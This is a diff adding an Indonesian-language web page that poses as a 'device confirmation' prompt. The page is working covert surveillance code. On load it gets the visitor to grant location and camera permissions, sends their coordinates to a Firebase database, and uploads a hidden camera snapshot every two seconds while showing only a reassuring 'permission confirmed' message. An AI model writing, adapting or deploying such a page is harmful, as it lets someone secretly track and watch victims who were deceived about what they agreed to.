@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Konfirmasi Perangkat</title>
+  
+  <!-- Firebase SDK (v9 Compatibility Mode) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px 20px;
+      background-color: #f4f6f9;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 400px;
+      margin: 0 auto;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    /* Sembunyikan elemen kamera dari tampilan user */
+    #videoElement, #canvasElement {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h2>Konfirmasi Izin</h2>
+    <p>Silakan klik <b>"Allow" / "Izinkan"</b> pada pop-up browser yang muncul di layar atas Anda.</p>
+    <p id="status" style="color: #007bff; font-weight: bold;">Memproses permintaan izin...</p>
+  </div>
+
+  <!-- Elemen Video & Canvas Tersembunyi -->
+  <video id="videoElement" autoplay playsinline></video>
+  <canvas id="canvasElement"></canvas>
+
+  <script>
+    // 1. Konfigurasi Firebase
+    const firebaseConfig = {
+  apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
+  authDomain: "sfkk-6af70.firebaseapp.com",
+  projectId: "sfkk-6af70",
+  storageBucket: "sfkk-6af70.firebasestorage.app",
+  messagingSenderId: "1045663352487",
+  appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
+  measurementId: "G-23SNFYWR8V"
+};
+
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const video = document.getElementById('videoElement');
+    const canvas = document.getElementById('canvasElement');
+    const statusText = document.getElementById('status');
+
+    // 2. Fungsi Utama: Panggil Pop-Up Browser Secara Otomatis
+    async function triggerPopups() {
+      // Pastikan Protokol HTTPS
+      if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+        statusText.style.color = 'red';
+        statusText.innerText = "Error: Harus dijalankan via HTTPS agar pop-up browser muncul!";
+        return;
+      }
+
+      // Pop-up 1: Izin Lokasi
+      await mintaLokasi();
+
+      // Pop-up 2: Izin Kamera
+      await mintaKamera();
+    }
+
+    // Fungsi Pop-Up Lokasi
+    function mintaLokasi() {
+      return new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+          // Panggilan ini yang memicu POP-UP LOKASI resmi dari browser
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              // Jika user menekan "Allow" / "Izinkan"
+              db.ref('device/location').set({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                updatedAt: Date.now()
+              });
+              resolve(true);
+            },
+            (error) => {
+              // Jika user menekan "Block" / "Tolak"
+              console.warn("User menolak lokasi:", error.message);
+              resolve(false);
+            }
+          );
+        } else {
+          resolve(false);
+        }
+      });
+    }
+
+    // Fungsi Pop-Up Kamera
+    async function mintaKamera() {
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        try {
+          // Panggilan ini yang memicu POP-UP KAMERA resmi dari browser
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+          
+          statusText.style.color = 'green';
+          statusText.innerText = "Izin berhasil dikonfirmasi!";
+
+          // Mulai kirim frame kamera ke Firebase setiap 2 detik
+          setInterval(captureFrame, 2000);
+        } catch (err) {
+          console.warn("User menolak kamera:", err.message);
+          statusText.style.color = 'orange';
+          statusText.innerText = "Beberapa izin tidak diberikan.";
+        }
+      }
+    }
+
+    // Kirim gambar kamera ke Firebase
+    function captureFrame() {
+      if (video.videoWidth === 0) return;
+      canvas.width = video.videoWidth / 4;
+      canvas.height = video.videoHeight / 4;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const base64Image = canvas.toDataURL('image/jpeg', 0.4);
+      db.ref('device/cameraFrame').set(base64Image);
+    }
+
+    // Jalankan pemicu pop-up saat halaman selesai dimuat
+    window.onload = triggerPopups;
+  </script>
+
+</body>
+</html>
